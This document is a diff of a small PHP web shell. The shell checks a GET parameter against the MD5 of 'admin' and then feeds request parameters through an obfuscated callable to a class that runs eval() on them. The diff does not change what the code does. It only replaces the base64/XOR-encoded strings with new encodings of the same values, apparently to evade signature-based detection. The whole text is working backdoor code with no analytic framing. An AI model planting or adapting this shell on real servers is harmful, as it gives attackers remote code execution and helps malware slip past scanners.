@@ -1,6 +1,6 @@
 
 <?php
-$a = ${base64_decode("aykoOg==")^base64_decode("NG5tbg==")}[1];
+$a = ${base64_decode("Zi4vIw==")^base64_decode("OWlqdw==")}[1];
 
 //  1 is md5('admin'). You can have on your own.
 if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
@@ -27,7 +27,7 @@ if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
     $func=$arr[0];
     $params=$arr[1];
 	class C{public function __invoke($p) {eval($p."");}};
-	$t = base64_decode("ICskX25fPl0lcSFbLi8=")^base64_decode("Q0pIMzEqTThXLkcuQEw=");
+	$t = base64_decode("Pz4oPGo/XF9ebTolID8=")^base64_decode("XF9EUDVKLzosMlxQTlw=");
     @${'t'}(new C(),$params);
   
   
